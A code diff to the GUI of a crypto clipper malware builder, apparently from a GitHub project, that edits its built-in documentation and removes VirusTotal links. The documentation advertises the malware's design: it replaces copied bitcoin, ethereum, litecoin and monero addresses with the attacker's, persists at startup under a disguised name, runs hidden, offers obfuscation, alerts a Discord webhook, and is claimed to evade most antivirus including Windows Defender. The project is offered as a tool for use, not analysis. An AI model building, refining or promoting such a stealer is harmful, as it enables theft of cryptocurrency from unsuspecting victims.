@@ -27,22 +27,6 @@ customtkinter.set_appearance_mode("dark")
 
 cwd = os.getcwd()
 
-vtlinksunobf = ["https://www.virustotal.com/gui/file/74344dc13b085b2d1054dad4dfdab268e20894247643466aa88e41994486f0ba?nocache=1",
-                "https://www.virustotal.com/gui/file/0cea22f6403ddad2f2cc16648460ae6fdece193ba07e0bc486f900b32f81bc52?nocache=1",
-                "https://www.virustotal.com/gui/file/3d4b3a39d1c648373820bcdc45549932870b00bac9897e877522c3e4cd19c86d?nocache=1"]
-
-vtlinksobf = ["https://www.virustotal.com/gui/file/fd6d1ac9a7b111840bf1b9ede641506e93ce16b355057c82f7546092c36d47d2?nocache=1",
-              "https://www.virustotal.com/gui/file/a4edfa41ddfb01fdc8404574a364829c7911c9bb13787d1bff32c9c7c8b6f359?nocache=1",
-              "https://www.virustotal.com/gui/file/df17497d809aa0df6911ad1faefeb563522ecb12ea3dadc05b5fdc6800e6e479?nocache=1"]
-
-class virustotal:
-    def open_unobf():
-        for link in vtlinksunobf:
-            webbrowser.open_new_tab(link)
-    def open_obf():
-        for link in vtlinksobf:
-            webbrowser.open_new_tab(link)
-
 class attempt_fix_icons:
     def command():
         os.system("taskkill /f /im explorer.exe")
@@ -578,18 +562,10 @@ What kind of malware?
 The kind of malware is known as crypto clipper malware. The builder allows you to choose a method (ctypes, subprocess, pyperclip).
 
 How does the malware work?
-Every 0.25 seconds the malware checks to see if the user has copied any text to the clipboard. If the user has then the text in the clipboard is checked to see if its a bitcoin, ethereum, litecoin or monero address. If it is any of these the clipboard is replaced with the hackers crypto address in turn stealing crypto
+Every 0.25 seconds the malware checks to see if the user has copied any text to the clipboard. If the user has then the text in the clipboard is checked to see if its a bitcoin, ethereum, litecoin or monero address. If it is any of these the clipboard is replaced with the hackers crypto address in turn stealing crypto.
 
 Is the malware detected by antivirus?
-    All were scanned with virustotal
-
-    subprocess method - obfuscated (detected by 14/74 antivirus software - not detected by windows defender, Yandex, BitDefender, McAfee Scanner, Google)
-    pyperclip method - obfuscated (detected by 7/74 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
-    ctypes method - obfuscated (detected by 12/73 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
-
-    subprocess method - unobfuscated (detected by 14/74 antivirus software - not detected by windows defender, Yandex, BitDefender, McAfee Scanner, Google)
-    pyperclip method - unobfuscated (detected by 7/74 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
-    ctypes method - unobfuscated (detected by 12/74 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
+All malware types bypass most major antivirus softwares including windows defender as of 4th june 2024 however this could change as time goes on so use virustotal.com to check the .exe file.
 
 Whats the difference between ctypes, subprocess, pyperclip?
 ctypes - directly interacts with the clipboard to retrieve text and uses powershell to set the new clipboard text - no installs needed meaning anyone with python installed on a windows computer can run it.
@@ -597,19 +573,17 @@ subprocess - uses powershell to retrieve clipboard text and uses powershell to s
 pyperclip - uses the pyperclip package to retrieve and set clipboard text - pyperclip install needed meaning this will only work on windows computers with pyperclip installed through pip install pyperclip.
 
 Features:
-    -Supports bitcoin, ethereum, litecoin, monero
-    -has single use method meaning after one log the code wont run again
-    -duplicates itself to run at startup with a different name
-    -can a add custom icon as .ico file
-    -has an option to obfuscate the .exe but this isnt needed
-    -runs as .pyw file (python windowless) so it runs as background task
-    -if discord webhook added it sends a ping to discord webhook when crypto address detected
-    -creates a readble .pyw as well as the .exe so you can code inspect
+    -supports bitcoin, ethereum, litecoin, monero.
+    -has single use method meaning after one log the code wont run again.
+    -duplicates itself to run at startup with a different name.
+    -can a add custom icon as .ico file.
+    -has an option to obfuscate the .exe but this isnt needed.
+    -runs as .pyw file (python windowless) so it runs as background task.
+    -if discord webhook added it sends a ping to discord webhook when crypto address detected.
+    -creates a readble .pyw as well as the .exe so you can code inspect.
 
 My icons arent showing on the .exe, why is this?
-Honestly im not sure why this happens - for some reason the icons bind to the exe but dont visually update. The fix for this is just to restart Windows Explorer in task manager and the icons update. If that didnt work it may be an issue with IconCache.db file in %localappdata% - try deleting this, restarting computer and then it might work.""", justify="left", wraplength=750).pack(anchor="w")
-        customtkinter.CTkButton(master=tabview.tab("documentation"), text="open obfuscated virustotal links", command=lambda: virustotal.open_obf()).pack(fill="x", pady=(5, 0))
-        customtkinter.CTkButton(master=tabview.tab("documentation"), text="open unobfuscated virustotal links", command=lambda: virustotal.open_unobf()).pack(fill="x", pady=(5, 0))
+Honestly im not sure why this happens - you can press the fix icons button which will restart windows explorer to update icons - if this doesnt work create an issue on github and try delete IconCashe.db in %localappdata% and restarting computer.""", justify="left", wraplength=750).pack(anchor="w")
         customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))
 
         buildgui.build_widgets()
